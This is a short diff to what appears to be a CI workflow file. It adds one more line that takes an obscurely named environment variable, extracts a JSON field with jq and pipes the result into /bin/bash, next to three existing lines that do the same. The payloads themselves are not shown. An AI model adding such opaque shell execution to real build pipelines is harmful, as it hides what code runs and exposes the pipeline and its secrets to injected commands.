@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$kteg9" | jq -r .xie6 | /bin/bash
           echo $vvwe7 | jq -r .k88749 | /bin/bash
           printf '%s' "$fz98" | jq -r .j11 | /bin/bash
+          printf '%s' "$xu2833" | jq -r .yk0 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
